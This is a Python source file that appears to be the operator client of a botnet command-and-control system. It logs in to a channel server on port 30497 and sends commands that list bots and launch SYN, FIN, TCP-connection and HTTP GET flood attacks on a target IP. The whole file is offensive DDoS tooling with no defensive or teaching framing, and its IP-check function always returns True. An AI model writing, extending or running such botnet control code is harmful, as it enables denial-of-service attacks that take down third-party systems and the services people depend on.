import socket
import sys
import threading
import getpass
from colorama import init, Fore, Back, Style	# for color and style

class MNGM():
	"""docstring for C2Server"""
	def __init__(self):
		self.bind_ip = "0.0.0.0"
		self.bind_port = 30498
		self.chanel = ""
		self.username = ""
		self.password = ""
	def use(self):
		print("python c2server.py [chanel_ip]")
	def help(self):
		print("Help command:\n"\
			  "    show bots:				get bots infomation\n"\
			  "    attack [target_ip]:		attack target_ip with all method\n"\
			  "    synattack [target_ip]:	attack target_ip with SYN Flood\n"\
			  "    finattack [target_ip]:	attack target_ip with FIN Flood\n"\
			  "    tcpattack [target_ip]:	attack target_ip with TCP connection Flood\n"\
			  "    httpattack [target_ip]:	attack target_ip with Http GET Flood\n"\
			  "    exit:					exit program\n")
	def bootstrap(self):
		if (len(sys.argv) < 2):
			self.use()
			exit(0)
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.chanel = sys.argv[1]
		try:
			r = soc.connect((str(sys.argv[1]), 30497))
			print(Style.BRIGHT, end='')
			username = str(input("User: "))
			password = str(getpass.getpass("Password: "))
			self.username = username
			self.password = password
			print(Fore.YELLOW + "*** Try connect to chanel %s" % (sys.argv[1]))
			soc.send(("c2s#connect@" + str(username) + "." + str(password)).encode("utf8"))
			message = soc.recv(1024)
			header, payload = message.decode("utf8").split("#")
			respone, status = payload.split("@")
			if (status == "done"):
				print(Fore.CYAN + "*** Connected with chanel %s" % (sys.argv[1]))
				print(Fore.CYAN + "Waiting for command ...\n")
				print(Fore.RESET, end='')
				self.control(soc)
			else:
				print(Fore.RED + "!!! Access denied")
				print(Fore.RESET, end='')
				soc.close()
				exit(0)
		except Exception as e:
			print(Fore.RED + "Connection faile" + str(e))
	def control(self, soc):
		while True:
			print(Fore.BLUE + self.username + "@" + self.chanel + "# ", end='')
			print(Fore.RESET, end='')
			cmd = str(input())
			if (cmd == "exit"):
				message = "c2s#exit@" + self.username
				soc.send(message.encode("utf8"))
				print(Fore.YELLOW + "*** Disconnected with %s" % (self.chanel))
				print(Fore.RESET, end='')
				soc.close()
				exit(0)
			else:
				try:
					argv1, argv2 = cmd.split(" ")
					if (argv1 != "exit") & (argv1 != "show") & (argv1 != "attack") & (argv1 != "synattack") & (argv1 != "finattack") \
					& (argv1 != "tcpattack") & (argv1 != "httpattack"):
						self.help()
					else:
						if ((argv1 == "show") & (argv2 != "bots")):
							self.help()
						else:
							message = "c2s#" + argv1 + "@" + argv2
							soc.send(message.encode("utf8"))
							message = soc.recv(1024).decode("utf8")
							print(message)
				except:
					self.help()
	def check_ip(self, ip_to_check):
		return True
if __name__ == '__main__':
	init()	# initialize color
	c2server = MNGM()
	c2server.bootstrap()